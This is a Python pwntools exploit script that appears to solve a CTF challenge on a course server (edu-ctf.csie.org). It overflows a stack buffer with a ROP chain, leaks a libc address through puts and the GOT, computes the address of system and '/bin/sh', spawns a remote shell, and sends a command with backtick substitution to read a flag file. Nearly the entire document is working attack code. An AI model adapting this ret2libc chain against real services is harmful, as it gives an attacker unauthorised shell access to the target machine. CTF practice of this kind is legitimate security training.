from pwn import *
context.arch = "amd64"

l = ELF('libc.so')
y = remote("edu-ctf.csie.org", 10175)


bss = 0x6b6000
pop_rdi = 0x0000000000400733
pop_rsi_r15 = 0x0000000000400731
ret = 0x400506


gets_plt = 0x400530
puts_plt = 0x400520
libc_start_main_got = 0x600ff0
main = 0x400698


p = flat(
    'a' * 0x38,
    pop_rdi,
    libc_start_main_got,
    puts_plt,
    main
)


y.sendlineafter(':D', p)
y.recvline()
libc = u64(y.recv(6) + '\0\0') - 0x21ab0
#l.address = u64(y.recv(6) + '\0\0') - 0x21ab0

print "libc ==> ", hex(libc)



system_off = 0x4f440
system_func_ptr = libc + system_off
bin_sh = libc + 0x1b3e9a


p = flat(
    'a' * 0x38,
    ret,
    pop_rdi,
    bin_sh,#l.search('/bin/sh').next(),
    system_func_ptr#l.sym.system
)


y.sendlineafter(':D', p)

y.sendline('cat /home`whoami`/flag')

y.interactive()


